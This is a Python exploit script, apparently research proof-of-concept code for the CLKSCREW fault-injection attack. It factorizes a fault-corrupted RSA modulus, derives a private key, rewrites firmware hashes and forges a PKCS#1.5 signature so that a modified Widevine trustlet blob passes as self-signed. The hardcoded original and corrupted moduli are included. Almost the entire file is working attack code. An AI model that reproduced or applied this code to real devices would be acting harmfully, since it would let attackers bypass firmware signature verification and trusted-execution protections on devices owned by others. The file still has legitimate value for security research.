import hashlib
import signal
from binascii import hexlify, unhexlify

from sage.all import ecm


class TimeoutError(Exception):
    def __init__(self, message):
        super(TimeoutError, self).__init__(message)


class Timeout:
    def __init__(self, seconds=1, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        raise TimeoutError(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)


def bn2hex(n):
    """ BigNumber -> hex string
    """
    h = hex(n)[2:]
    if 'L' in h:
        h = h[:-1]
    if len(h) % 2 == 1:
        h = '0' + h
    return h


def sha256_hex(d):
    return hashlib.sha256(d).hexdigest()


def sha256_bin(d):
    return unhexlify(sha256_hex(d))


def power(x, m, n):
    """ Compute x^m modulo n using O(log(m)) operations.
    """
    a = 1
    while m > 0:
        if m % 2 == 1:
            a = (a * x) % n
        x = (x * x) % n
        m //= 2
    return a


def gcd(a, b):
    """ Compute the GCD of a and b using Euclid's algorithm.
    """
    while a != 0:
        a, b = b % a, a
    return b


def carmichael(factors):
    """ Reduced totient function
    Ref: https://en.wikipedia.org/wiki/Carmichael_function
    """
    done = []
    lst_e = []
    for p in factors:
        if p in done:
            continue
        m = factors.count(p)
        e = (p ** (m-1)) * (p - 1)
        done.append(p)
        lst_e.append(e)
    return reduce(lambda x,y: x*y/gcd(x,y), lst_e)


def mod_inverse(a, m):
    """ Compute the modular inverse of a % m, which is the number x such that a*x % m = 1.
    
    Credits: Cryptomath Module
    http://inventwithpython.com/hacking (BSD Licensed)
    """
    if gcd(a, m) != 1:
        return None # no mod inverse if a & m aren't relatively prime

    # Calculate using the Extended Euclidean Algorithm:
    u1, u2, u3 = 1, 0, a
    v1, v2, v3 = 0, 1, m
    while v3 != 0:
        q = u3 // v3 # // is the integer division operator
        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3
    return u1 % m


def derive_private_exp(factors, exp_pub):
    """ Derive private exponent d, given public exponent e and factors of modulus N'.
    """
    c = carmichael(factors)
    if gcd(exp_pub, c) != 1:
        raise Exception('ERROR: nprime not usable')
    dprime = mod_inverse(exp_pub, c)
    return dprime


def factorize_modprime(n, t_timeout=60):
    """ Factorize modulus n into factors, if possible.
    
    Use this procedure to look for exploitable modulus collected from 
    experiments.
    
    Requirements:
    - Install SageMath (http://doc.sagemath.org/pdf/en/installation/installation.pdf)
    - Use sage built-in python for this function
        $ export PATH=$PATH:/home/user/SageMath/local/bin
        $ export SAGE_ROOT=/home/user/SageMath
        $ export SAGE_LOCAL=/home/user/SageMath/local
        $ /home/user/SageMath/local/bin/python pycrypto.py
    
    @param n:           modulus n to be factorized
    @param t_timeout:   timeout in secs
    
    @returns list of factors, None if no success
    """
    factors = None
    try:
        with Timeout(seconds=t_timeout):
            factors = ecm.factor(n)
        factors = map(long, factors)
    except TimeoutError:
        pass
    return factors


def ext_euclid(A, B, C):
    """ Extended Euclidean Algorithm.
    Useful in situations where:   B = C mod A.
    Compute (x, y) s.t. xA + yB = C, where A > B.
    
    @returns x and y
    """
    u1, u2, u3 = 1, 0, A
    v1, v2, v3 = 0, 1, B
    while v3 != 0:
        q = u3 // v3
        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3
    d = gcd(A, B)
    x = u1; y = u2
    return (x * C) // d, (y * C) // d


def mont_prod(a, b, N, r_inv):
    """ Montgomery multiplication.
    """
    return (a * b * r_inv) % N


def precompute_nprime_0(n, bitlen=None):
    """ Compute the Montgomery residual inverse.
    """
    # compute bitlen
    n_bitlen = bitlen
    if not bitlen:
        i = 0
        while n >> i > 1:
            i += 1
        n_bitlen = i
    
    # compute r' = base ** bitlen
    r = 2 ** n_bitlen
    
    # compute n' s.t. r.r_inv - n.n' = 1
    # n' = -N^{-1} mod r
    u1, u2, u3 = 1, 0, n
    v1, v2, v3 = 0, 1, r
    while v3 != 0:
        q = u3 // v3
        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3
    r_inv = u2
    n_prime = u1
    if r_inv < 0:
        r_inv = n + r_inv
    if n_prime > 0:
        n_prime = r - n_prime
    
    return n_bitlen, r, r_inv, n_prime


def derive_attack_sig_montpro(sig_goal, N_orig, N_attack, l=2048):
    """ Refer to the following for cryptanalysis:
    
    CLKSCREW: Exposing the Perils of Security-Oblivious Energy Management, 
        A. Tang, S. Sethumadhavan and S. Stolfo, 
        in 26th USENIX Security Sympo- sium (USENIX Security 2017)
    """
    R = 2 ** l
    _,_, R_inv_orig, _ = precompute_nprime_0(N_orig, l)
    _,_, R_inv_attack, _ = precompute_nprime_0(N_attack, l)
    
    # Attack goal (not used in the derivation of attack signature, S')
    # We compute it here for debugging and verification purposes.
    xbar_goal = mont_prod(sig_goal, (R ** 2) % N_attack, N_attack, R_inv_attack)
    
    rhs_goal = (sig_goal * ((R**2)%N_attack) * R_inv_attack) % N_attack
    K = (((R**2)%N_orig) * R_inv_attack) % N_attack
    _, sig_attack = ext_euclid(N_attack, K, rhs_goal)
    return sig_attack % N_attack


def make_selfsigned_blob(norig, nprime, fn_prefix, exp_pub=0x10001):
    """ Generate self-signed binary blob, given a candidate corrupted modulus.
    """
    # Key size (in bytes)
    KEY_SIZE = 256
    
    # Offsets in our firmware binary
    OFFSET_HASH_B02 = 0x11C
    OFFSET_MDT_SIGNATURE = 0x1713
    OFFSET_MDT_HASH_START = 0xb4
    
    # Factorize candidate corrupted modulus N'
    factors = factorize_modprime(nprime)
    if factors is None:
        print "FAILURE: nprime cannot be factorized"
        return
    
    # Derive secret private exponent d'
    dprime = derive_private_exp(factors, exp_pub)
    
    # Read mdt file and get original hashes
    with open(fn_prefix + '.mdt', 'rb') as fh:
        data_mdt = fh.read()
    
    mdt_hash_b02 = data_mdt[OFFSET_HASH_B02: OFFSET_HASH_B02+0x20]
    mdt_hash_b03 = data_mdt[OFFSET_HASH_B02+0x20: OFFSET_HASH_B02+0x40]
    mdt_sign = data_mdt[OFFSET_MDT_SIGNATURE: OFFSET_MDT_SIGNATURE+KEY_SIZE]
        
    # Read and compute .b02 and .b03 files
    with open(fn_prefix + '.b02', 'rb') as fh:
        data_b02 = fh.read()
    with open(fn_prefix + '.b03', 'rb') as fh:
        data_b03 = fh.read()
    
    hash_b02 = sha256_hex(data_b02)
    hash_b03 = sha256_hex(data_b03)
    
    # Adjust hash
    data_mdt = list(data_mdt)
    data_mdt[OFFSET_HASH_B02: OFFSET_HASH_B02+0x20] = list(sha256_bin(data_b02))
    data_mdt[OFFSET_HASH_B02+0x20: OFFSET_HASH_B02+0x40] = list(sha256_bin(data_b03))
    
    # Compute new hash based on .b02 and .b03 files
    mdt_sha256_hex = sha256_hex(''.join(data_mdt[OFFSET_MDT_HASH_START: OFFSET_MDT_HASH_START+0x1000]))
    
    # SHA256 hash
    sha256 = int(mdt_sha256_hex, 16)
    
    # Padding
    padding = 0x3031300d060960864801650304020105000420
    
    # PKCS#1.5 padding + hash
    pt_bin =    "\x00\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + \
                "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00"             + \
                unhexlify(bn2hex(padding)) + \
                unhexlify(bn2hex(sha256))
    
    # Encrypt new hash with our newly derived keypair
    pt = int(pt_bin.encode('hex'), 16)
    ct = power(pt, dprime, nprime)
    
    # Derived signature (We only modify the 4th certificate in the chain)
    # Note how both original and corrupted moduli are needed here.
    cert4_new_sig_patched = derive_attack_sig_montpro(ct, norig, nprime)
    
    # Save to new MDT
    ct_bin = unhexlify(bn2hex(cert4_new_sig_patched))
    data_mdt[OFFSET_MDT_SIGNATURE: OFFSET_MDT_SIGNATURE+KEY_SIZE] = list(ct_bin)
    with open(fn_prefix + '__self-signed.mdt', 'wb') as fh:
        fh.write(''.join(data_mdt))
    
    # Print final compute attack signature
    print '  nprime:  ', bn2hex(nprime)
    print '  dprime:  ', bn2hex(dprime)
    print '  new_mdt: ', bn2hex(ct)
    print '  new_cert:', bn2hex(cert4_new_sig_patched)



#==============================================================================
if __name__ == '__main__':
    
    # Original modulus N from the 4th certificate in the chain for widevine update blob
    n_original =    0xc44dc735f6682a261a0b8545a62dd13df4c646a5ede482cef858925baa1811fa0284766b3d1d2b4d6893df4d9c045efe3e84d8c5d03631b25420f1231d8211e2322eb7eb524da6c1e8fb4c3ae4a8f5ca13d1e0591f5c64e8e711b3726215cec59ed0ebc6bb042b917d44528887915fdf764df691d183e16f31ba1ed94c84b476e74b488463e85551022021763af35a64ddf105c1530ef3fcf7e54233e5d3a4747bbb17328a63e6e3384ac25ee80054bd566855e2eb59a2fd168d3643e44851acf0d118fb03c73ebc099b4add59c39367d6c91f498d8d607af2e57cc73e3b5718435a81123f080267726a2a9c1cc94b9c6bb6817427b85d8c670f9a53a777511b
    
    # Corrupted modulus N' collected from the experiments
    n_candidate =   0xc44dc735f6682a261a0b8545a62dd13df4c646a5ede482cef858925baa1811fa0284766b3d1d2b4d6893df4d9c045efe3e84d8c5d03631b25420f1231d8211e2322eb7eb524da6c1e8fb4c3ae4a8f5ca13d1e0591f5c64e8e711b3726215cec59ed0ebc6bb042b917d44528887915fdf764df691d183e16f31ba1ed94c84b476e74b488463e85551022021763a3a3a64ddf105c1530ef3fcf7e54233e5d3a4747bbb17328a63e6e3384ac25ee80054bd566855e2eb59a2fd168d3643e44851acf0d118fb03c73ebc099b4add59c39367d6c91f498d8d607af2e57cc73e3b5718435a81123f080267726a2a9c1cc94b9c6bb6817427b85d8c670f9a53a777511b
    
    # Generate the self-signed binary blob for widevine
    make_selfsigned_blob(n_original, n_candidate, 'widevine/widevine')